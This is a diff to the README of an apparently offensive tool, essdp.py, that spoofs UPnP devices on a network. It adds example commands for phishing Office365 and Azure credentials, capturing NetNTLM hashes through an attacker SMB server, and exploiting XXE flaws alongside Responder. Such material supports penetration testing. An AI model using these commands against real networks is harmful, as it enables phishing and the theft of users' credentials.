@@ -24,6 +24,24 @@ You do NOT need to edit the variables in the template files - the tool will do t
 
 You can choose between the included templates in the "templates" folder or build your own simply by duplicating an existing folder and editing the files inside. This allows you to customize the device name, the phishing contents page, or even build a totally new type of UPNP device that I haven't created yet.
 
+Some example scenarios:
+
+```
+# Use wlan0 for device advertisement and phishing, capturing NetNTLM and hoping for clear-text with Office365 spoof:
+essdp.py wlan0 -t office365
+
+# Same as above, but assuming your SMB server is running on another IP:
+essdp.py wlan0 -t office365 -s 192.168.1.205
+
+# Prompt for creds using basic auth and redirect to Azure:
+essdp.py wlan0 -t microsoft-azure -u 'https://azure.microsoft.com/auth/signin/' -b
+
+# Hope for an XXE vul to capture NetNTLM while Impacket/Responder is running on wlan0:
+essdp.py wlan0 -t xxe-smb
+```
+
+Full usage details:
+
 ```
 usage: essdp.py [-h] [-p PORT] [-t TEMPLATE] [-s SMB] [-b] [-r REALM] [-u URL]
                 interface
